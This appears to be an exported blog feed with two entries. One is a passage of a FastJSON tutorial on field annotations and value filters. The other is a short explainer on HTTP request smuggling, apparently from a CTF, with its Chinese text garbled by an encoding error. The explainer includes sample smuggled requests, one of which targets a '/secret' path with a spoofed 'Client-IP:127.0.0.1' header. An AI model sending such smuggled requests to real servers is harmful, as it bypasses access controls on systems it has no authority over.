class="keyword">class</span> <span class="title">Fortest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;JavaToJson&gt; listOfJava = <span class="keyword">new</span> ArrayList&lt;JavaToJson&gt;();</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        listOfJava.add(<span class="keyword">new</span> JavaToJson(<span class="number">18</span>,<span class="string">&quot;wndmd&quot;</span>,<span class="keyword">new</span> Date()));</span><br><span class="line">        listOfJava.add(<span class="keyword">new</span> JavaToJson(<span class="number">20</span>,<span class="string">&quot;Json!&quot;</span>,<span class="keyword">new</span> Date()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        String list = JSON.toJSONString(listOfJava);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œä¸Šè¿°ä»£ç éœ€è¦å¦å¤–èµ·ä¸€ä¸ªç±»ï¼Œtestä¸å…è®¸åœ¨æœ‰å‚æ„é€ çš„ç±»ä¸­å‡ºç°</p>
<p>å¾—åˆ°è¾“å‡ºç»“æœï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;<span class="attr">&quot;Age&quot;</span>:<span class="number">18</span>,</span><br><span class="line">     <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="number">1604309562809</span>,</span><br><span class="line">     <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;wndmd&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;Age&quot;</span>:<span class="number">20</span>,</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="number">1604309562809</span>,</span><br><span class="line">        <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Json!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬è¿˜å¯ä»¥æ ¼å¼åŒ–è‡ªå®šä¹‰è¾“å‡ºï¼Œæ§åˆ¶å­—æ®µçš„æ’åºã€‚</p>
<p>æˆ‘ä»¬æ›´æ–°beanå¹¶æ·»åŠ å¦‚ä¸‹å­—æ®µï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaToJson</span> </span>&#123;</span><br><span class="line">    <span class="meta">@JSONField(name = &quot;Age&quot;,serialize = false)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JSONField(name = &quot;FULL NAME&quot;,ordinal = 2)</span></span><br><span class="line">    <span class="keyword">private</span> String fullName;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JSONField(name = &quot;DATE OF BIRTH&quot;,format = &quot;dd/MM/yyyy&quot;,ordinal = 1)</span></span><br><span class="line">    <span class="keyword">private</span> Date date;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„åœ¨è¿™é‡Œæˆ‘ä»¬æ·»åŠ serialize = falseï¼Œè¿™é‡Œæ˜¯é»˜è®¤æˆ‘ä»¬æ·»åŠ åºåˆ—åŒ–ï¼Œå¦‚æœæˆ‘ä»¬è®¾ç½®ä¸ºfalseï¼Œè¯¥å­—æ®µå°†ä¸ä¼šè¢«æ˜¾ç¤ºã€‚</p>
<p>è€Œordinalï¼Œåˆ™æ˜¯ç”¨äºè§„å®šæ ¼å¼åŒ–çš„é¡ºåºï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä½ æƒ³æ§åˆ¶ï¼Œæœ€å¥½å°±å…¨éƒ¨éƒ½ä½¿ç”¨è¯¥å±æ€§ä¿®é¥°ï¼Œæˆ–è€…ä½ è‡ªå·±å¹²è„†å†™çš„æ—¶å€™å°±ä»ä¸Šå‘ä¸‹å†™ï¼Œä¸ç„¶çš„è¯ï¼Œé»˜è®¤ä»ä¸Šå‘ä¸‹æ‰§è¡Œï¼Œåªä¼šå†æŒ‰ç…§ordinalé™å®šçš„é¡ºåºæ’åˆ—</p>
<p>ä¸Šè¿°ä»£ç è¾“å‡ºï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;02/11/2020&quot;</span>,</span><br><span class="line">     	<span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;wndmd&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line"> 	&#123;</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;02/11/2020&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Json!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>å¦‚æœå°†serializeçš„falseå»æ‰ä¹‹åï¼Œä»–è¿˜æ˜¯ç¬¬ä¸€ä¸ªè¢«æ‰§è¡Œï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;Age&quot;</span>:<span class="number">18</span>,</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;02/11/2020&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;wndmd&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;Age&quot;</span>:<span class="number">20</span>,</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;02/11/2020&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Json!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="ä½œç”¨å¯¹è±¡"><a href="#ä½œç”¨å¯¹è±¡" class="headerlink" title="ä½œç”¨å¯¹è±¡"></a>ä½œç”¨å¯¹è±¡</h2><p>@JSONField çš„ä½œç”¨å¯¹è±¡:</p>
<ul>
<li><ol>
<li>Field</li>
</ol>
</li>
<li><ol start="2">
<li>Setter å’Œ Getter æ–¹æ³•</li>
</ol>
</li>
</ul>
<p>éœ€è¦æ³¨æ„å¦‚ä¸‹ä¸¤ç‚¹ï¼š</p>
<p><strong>æ³¨æ„ï¼š</strong>FastJson åœ¨è¿›è¡Œæ“ä½œæ—¶ï¼Œæ˜¯æ ¹æ® getter å’Œ setter çš„æ–¹æ³•è¿›è¡Œçš„ï¼Œå¹¶ä¸æ˜¯ä¾æ® Field è¿›è¡Œã€‚</p>
<p><strong>æ³¨æ„ï¼š</strong>è‹¥å±æ€§æ˜¯ç§æœ‰çš„ï¼Œå¿…é¡»æœ‰ set æ–¹æ³•ã€‚å¦åˆ™æ— æ³•ååºåˆ—åŒ–ã€‚</p>
<p>è·Ÿè¿›JSONFieldæŸ¥çœ‹æºç ï¼Œå¯ä»¥çŸ¥é“æˆ‘ä»¬å…è®¸æŒ‡å®šå¾ˆå¤šä¸œè¥¿=ã€‚=ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> JSONField &#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">ordinal</span><span class="params">()</span> <span class="keyword">default</span> 0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">name</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">format</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">serialize</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">true</span></span>;</span><br><span class="line">	<span class="comment">//æ³¨æ„è¿™é‡Œï¼Œååºåˆ—åŒ–ï¼</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">deserialize</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">true</span></span>;</span><br><span class="line"></span><br><span class="line">    SerializerFeature[] serialzeFeatures() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    Feature[] parseFeatures() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">label</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">jsonDirect</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">false</span></span>;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; serializeUsing() <span class="keyword">default</span> Void.class;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; deserializeUsing() <span class="keyword">default</span> Void.class;</span><br><span class="line"></span><br><span class="line">    String[] alternateNames() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">unwrapped</span><span class="params">()</span> <span class="keyword">default</span> <span class="keyword">false</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">defaultValue</span><span class="params">()</span> <span class="keyword">default</span> &quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="é…ç½®æ–¹å¼"><a href="#é…ç½®æ–¹å¼" class="headerlink" title="é…ç½®æ–¹å¼"></a>é…ç½®æ–¹å¼</h2><p>FieldInfo å¯ä»¥é…ç½®åœ¨ getter/setter æ–¹æ³•æˆ–è€…å­—æ®µä¸Šã€‚ä¾‹å¦‚ï¼š</p>
<h3 id="é…ç½®åœ¨-getter-setter-ä¸Š"><a href="#é…ç½®åœ¨-getter-setter-ä¸Š" class="headerlink" title="é…ç½®åœ¨ getter/setter ä¸Š"></a>é…ç½®åœ¨ getter/setter ä¸Š</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">      <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line"> </span><br><span class="line">      <span class="meta">@JSONField(name=&quot;ID&quot;)</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> id;&#125;</span><br><span class="line">      <span class="meta">@JSONField(name=&quot;ID&quot;)</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;<span class="keyword">this</span>.id = id;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="é…ç½®åœ¨-field-ä¸Š"><a href="#é…ç½®åœ¨-field-ä¸Š" class="headerlink" title="é…ç½®åœ¨ field ä¸Š"></a>é…ç½®åœ¨ field ä¸Š</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">     <span class="meta">@JSONField(name=&quot;ID&quot;)</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> id;&#125;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;<span class="keyword">this</span>.id = id;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="åˆ›å»º-JSON-å¯¹è±¡"><a href="#åˆ›å»º-JSON-å¯¹è±¡" class="headerlink" title="åˆ›å»º JSON å¯¹è±¡"></a>åˆ›å»º JSON å¯¹è±¡</h2><p>åˆ›å»º JSON å¯¹è±¡éå¸¸ç®€å•ï¼Œåªéœ€ä½¿ç”¨ JSONObjectï¼ˆfastJsonæä¾›çš„jsonå¯¹è±¡ï¼‰ å’Œ JSONArrayï¼ˆfastJsonæä¾›jsonæ•°ç»„å¯¹è±¡ï¼‰ å¯¹è±¡å³å¯ã€‚</p>
<p>è™½ç„¶JSONArryayä¹Ÿå¯ä»¥åˆ›å»ºä¸€ä¸ªJSONå¯¹è±¡ï¼Œä½†æˆ‘è§‰å¾—ä¹¦å†™æ–¹å¼ä¸å¤Ÿç¾è§‚ï¼Œå…¶ä¸­å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">whenGenerateJson_thanGenerationCorrect</span><span class="params">()</span> <span class="keyword">throws</span> ParseException </span>&#123;</span><br><span class="line">    JSONArray jsonArray = <span class="keyword">new</span> JSONArray();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">        JSONObject jsonObject = <span class="keyword">new</span> JSONObject();</span><br><span class="line">        jsonObject.put(<span class="string">&quot;AGE&quot;</span>, <span class="number">10</span>);</span><br><span class="line">        jsonObject.put(<span class="string">&quot;FULL NAME&quot;</span>, <span class="string">&quot;Doe &quot;</span> + i);</span><br><span class="line">        jsonObject.put(<span class="string">&quot;DATE OF BIRTH&quot;</span>, <span class="string">&quot;2016/12/12 12:12:12&quot;</span>);</span><br><span class="line">        jsonArray.add(jsonObject);</span><br><span class="line">    &#125;</span><br><span class="line">    String jsonOutput = jsonArray.toJSONString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="JSON-å­—ç¬¦ä¸²è½¬æ¢ä¸º-Java-å¯¹è±¡"><a href="#JSON-å­—ç¬¦ä¸²è½¬æ¢ä¸º-Java-å¯¹è±¡" class="headerlink" title="JSON å­—ç¬¦ä¸²è½¬æ¢ä¸º Java å¯¹è±¡"></a>JSON å­—ç¬¦ä¸²è½¬æ¢ä¸º Java å¯¹è±¡</h2><p>fastjsonå…è®¸æˆ‘ä»¬å¯ä»¥å°†å‰ç«¯ä¼ æ¥çš„æ•°æ®è½¬æ¢å˜æˆJSONæ•°æ®ï¼ŒåŒæ ·çš„ä¹Ÿå…è®¸æˆ‘ä»¬æŠŠåç«¯æ•°æ®è½¬æ¢ä¸ºJSONå­—ç¬¦ä¸²ä¸¢ç»™å‰ç«¯ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">jsonToJava</span><span class="params">()</span></span>&#123;</span><br><span class="line">        JavaToJson miaomiaomiao = <span class="keyword">new</span> JavaToJson(<span class="number">21</span>, <span class="string">&quot;miaomiaomiao&quot;</span>, <span class="keyword">new</span> Date());</span><br><span class="line">        String jsonObject = JSON.toJSONString(miaomiaomiao);</span><br><span class="line"><span class="comment">//        System.out.println(jsonObject);</span></span><br><span class="line"><span class="comment">//        è¿™å‰é¢çš„partæˆ‘ä»¬å°†æ•°æ®è½¬æ¢æˆäº†JSONæ•°æ®</span></span><br><span class="line">        JavaToJson newJavaObject = JSON.parseObject(jsonObject,JavaToJson.class);</span><br><span class="line"><span class="comment">//        æŒ‡å®šéœ€è¦è½¬æ¢çš„JSONå­—ç¬¦ä¸²ï¼Œå¹¶ä¸”æŒ‡å®šåŸå‹,è¿™æ ·çš„è¯ä¸€ä¸ªJAVAå¯¹è±¡å°±æŒ‡å®šå¥½äº†</span></span><br><span class="line">        System.out.println(newJavaObject.getAge());</span><br><span class="line">        System.out.println(newJavaObject.getFullName());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="ä½¿ç”¨ContextValuFilteré…ç½®JSONè½¬æ¢"><a href="#ä½¿ç”¨ContextValuFilteré…ç½®JSONè½¬æ¢" class="headerlink" title="ä½¿ç”¨ContextValuFilteré…ç½®JSONè½¬æ¢"></a>ä½¿ç”¨ContextValuFilteré…ç½®JSONè½¬æ¢</h3><p>åœ¨æœ‰äº›åœºæ™¯ä¸­ï¼Œå¯¹Valueåšè¿‡æ»¤ï¼Œéœ€è¦è·å¾—æ‰€è¿°JavaBeançš„ä¿¡æ¯ï¼Œè€Œæˆ‘ä»¬å¯èƒ½æƒ³è¦è¿‡æ»¤æŸäº›ä¿¡æ¯ï¼Œä¾¿å¯ä»¥ä½¿ç”¨è¯¥æ–¹æ³•è¿›è¡Œæ“ä½œäº†ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Before</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span></span>&#123;</span><br><span class="line">      listOfJava.add(<span class="keyword">new</span> JavaToJson(<span class="number">31</span>,<span class="string">&quot;wdnmd&quot;</span>,<span class="keyword">new</span> Date()));</span><br><span class="line">      listOfJava.add(<span class="keyword">new</span> JavaToJson(<span class="number">33</span>,<span class="string">&quot;wd&quot;</span>,<span class="keyword">new</span> Date()));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Test</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">givenContextFilter_whenJavaObject_thanJsonCorrect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      ContextValueFilter valueFilter = <span class="keyword">new</span> ContextValueFilter () &#123;</span><br><span class="line">          <span class="function"><span class="keyword">public</span> Object <span class="title">process</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">                  BeanContext context, Object object, String name, Object value)</span> </span>&#123;</span><br><span class="line">              <span class="keyword">if</span> (name.equals(<span class="string">&quot;DATE OF BIRTH&quot;</span>)) &#123;</span><br><span class="line">                  <span class="keyword">return</span> <span class="string">&quot;NOT TO DISCLOSE&quot;</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> (value.equals(<span class="string">&quot;wdnmd&quot;</span>)) &#123;</span><br><span class="line">                  <span class="keyword">return</span> ((String) value).toUpperCase();</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;;</span><br><span class="line">      String jsonOutput = JSON.toJSONString(listOfJava, valueFilter);</span><br><span class="line">      System.out.println(jsonOutput);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>ç»è¿‡ä¸Šè¿°ä»£ç çš„æ“ä½œï¼Œæˆ‘ä»¬çš„æ—¶é—´å°†ä¼šä¿®æ”¹ä¸ºNOT TO DISCLOSEï¼Œå¹¶ä¸”æ•°æ®ä¸­ä¸åŒ…å«wdnmdçš„å°†ä¼šè¢«è¿‡æ»¤,å…·ä½“è¾“å‡ºå¦‚ä¸‹ï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;NOT TO DISCLOSE&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;NOT TO DISCLOSE&quot;</span></span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;NOT TO DISCLOSE&quot;</span>,<span class="attr">&quot;FULL NAME&quot;</span>:<span class="string">&quot;wdnmd&quot;</span></span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="attr">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;NOT TO DISCLOSE&quot;</span></span><br><span class="line">     &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Java</tag>
        <tag>å¼€å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>httpèµ°ç§</title>
    <url>/2021/02/07/http%E8%B5%B0%E7%A7%81/</url>
    <content><![CDATA[<p>ä¹Ÿæ˜¯åœ¨Hgameé‡Œé¢é‡è§äº†æ‰å­¦ä¹ åˆ°ï¼Œhttpèµ°ç§äº§ç”Ÿçš„åŸå› å¾ˆç®€å•ï¼Œå°±æ˜¯å› ä¸ºHTTPåè®®æä¾›ä¸¤ç§æ–¹å¼æ¥å†³å®šç»“æŸçš„æ–¹å¼ï¼Œåˆ†åˆ«æœ‰ <code>Content-Length</code>æ ‡å¤´å’Œ<code>Transfer-Encoding</code>æ ‡å¤´ï¼ŒContent-Lenthæˆ‘ä»¬ä¸€èˆ¬è§å¾—å¤šï¼Œå®ƒä»¥å­—èŠ‚ä¸ºå•ä½æŒ‡å®šæ¶ˆæ¯å†…å®¹ä½“çš„é•¿åº¦ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ac6f1ff11e5c7d4e806912d000080058.web-security-academy.net</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Cookie</span>: session=5n2xRNXtAYM9teOEn3jSkEDDabLe0Qv8</span><br><span class="line"><span class="attribute">Content-Length</span>: 35</span><br><span class="line">a=11</span><br></pre></td></tr></table></figure>

<p><code>Transfer-Encoding</code>æ ‡å¤´ç”¨äºæŒ‡å®šæ¶ˆæ¯ä½“ä½¿ç”¨åˆ†å—ç¼–ç ï¼ˆChunked Encodeï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´æ¶ˆæ¯æŠ¥æ–‡ç”±ä¸€ä¸ªæˆ–å¤šä¸ªæ•°æ®å—ç»„æˆï¼Œæ¯ä¸ªæ•°æ®å—å¤§å°ä»¥å­—èŠ‚ä¸ºå•ä½ï¼ˆåå…­è¿›åˆ¶è¡¨ç¤ºï¼‰ è¡¡é‡ï¼Œåè·Ÿæ¢è¡Œç¬¦ï¼Œç„¶åæ˜¯å—å†…å®¹ï¼Œæœ€é‡è¦çš„æ˜¯ï¼šæ•´ä¸ªæ¶ˆæ¯ä½“ä»¥å¤§å°ä¸º0çš„å—ç»“æŸï¼Œä¹Ÿå°±æ˜¯è¯´è§£æé‡åˆ°0æ•°æ®å—å°±ç»“æŸã€‚å¦‚ï¼š</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ac6f1ff11e5c7d4e806912d000080058.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="attribute">b</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">a=11</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br></pre></td></tr></table></figure>

<p>å…¶å®ç†è§£èµ·æ¥æ¼æ´çœŸçš„å¾ˆç®€å•ï¼Œå°±æ˜¯å‰åç«¯å¯¹äºHTTPç»“æŸçš„è§„å®šä¸åŒï¼Œæ¯”å¦‚å‰ç«¯å¯èƒ½è¯»å–åˆ°Content-Lengthå°±è®¤ä¸ºè¿™æ®µè¯·æ±‚ç»“æŸäº†ï¼Œè€Œæ•´ä¸ªè¯·æ±‚åŒ…è¢«å‘é€è¿‡å»çš„æ—¶å€™åç«¯è¯»å–åˆ°äº†Transfer-Encodingï¼Œè®¤ä¸ºåˆ°è¿™ç»“æŸï¼Œæ‰€ä»¥ä¸¤è€…å°±å¤„ç†ä¸åŒäº†ã€‚</p>
<p>é‚£ä¹ˆå°±å¯èƒ½äº§ç”Ÿå¦‚ä¸‹å‡ ç§ä¸åŒæƒ…å†µï¼š</p>
<h3 id="å‰ç«¯å¤„ç†Content-Length-åç«¯ä¸å¤„ç†"><a href="#å‰ç«¯å¤„ç†Content-Length-åç«¯ä¸å¤„ç†" class="headerlink" title="å‰ç«¯å¤„ç†Content-Length,åç«¯ä¸å¤„ç†"></a>å‰ç«¯å¤„ç†Content-Length,åç«¯ä¸å¤„ç†</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: police.liki.link</span><br><span class="line"><span class="attribute">Content-Length</span>: 77</span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/secret</span>  <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> police.liki.link</span><br><span class="line"><span class="attribute">Client-IP:127.0.0.1</span></span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå‰ç«¯å¤„ç†åˆ°Content-Lenthä¹‹åå°±ä¼šåœä¸‹ï¼Œä½†æ˜¯åç«¯å¹¶ä¸ä¼šï¼Œç»§ç»­å¤„ç†ååŠæ®µçš„è¯·æ±‚ã€‚</p>
<h3 id="å‰åç«¯å¤„ç†CLæ–¹å¼ä¸åŒ"><a href="#å‰åç«¯å¤„ç†CLæ–¹å¼ä¸åŒ" class="headerlink" title="å‰åç«¯å¤„ç†CLæ–¹å¼ä¸åŒ"></a>å‰åç«¯å¤„ç†CLæ–¹å¼ä¸åŒ</h3><p>å½“è¯·æ±‚ä¸­å‡ºç°ä¸¤ä¸ªCLçš„æ—¶å€™ï¼Œå‰åç«¯çš„å¤„ç†æ–¹å¼ä¸åŒä¹Ÿä¼šå¯¼è‡´æ¼æ´è¯ç”Ÿï¼Œä¾‹å­ï¼š</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: police.liki.link</span><br><span class="line"><span class="attribute">Content-Length</span>: 89</span><br><span class="line"><span class="attribute">Content-Length</span>: 90</span><br><span class="line"></span><br><span class="line">(ä¸­é—´ç•¥è¿‡)</span><br><span class="line"><span class="attribute">123456</span></span><br><span class="line"><span class="attribute">78</span></span><br></pre></td></tr></table></figure>

<p>å‡è®¾åˆ°78å‰é¢æ­£å¥½ä¸º89ä¸ªå­—ç¬¦çš„è¯ï¼Œæ¯”å¦‚åƒè¿™æ ·ä¸€ä¸ªè¯·æ±‚ï¼Œå‰ç«¯è¯»å–ç¬¬ä¸€ä¸ªCLè®¤ä¸ºè¯·æ±‚ä½“åŒ…æ‹¬äº†<code>12345\r\na</code>ï¼Œè€Œåç«¯è¯»å–ç¬¬äºŒä¸ªCLï¼Œè®¤ä¸ºè¯·æ±‚ä½“åªåŒ…æ‹¬åˆ°äº†<code>12345\r\n</code>ã€‚äºæ˜¯åé¢çš„<code>a</code>å°±åˆ°äº†ç¼“å†²åŒºä¹‹ä¸­ï¼Œå½“åˆæœ‰ç”¨æˆ·è¿›è¡Œè¿™æ ·ä¸€ä¸ªè®¿é—®æ—¶ï¼š</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: police.liki.link</span><br><span class="line"><span class="attribute">Content-Length</span>: 77</span><br></pre></td></tr></table></figure>

<p>å°±ä¼šäº§ç”Ÿä¸å­˜åœ¨aPOSTè¿™ç§è®¿é—®æ–¹å¼çš„é”™è¯¯äº†</p>
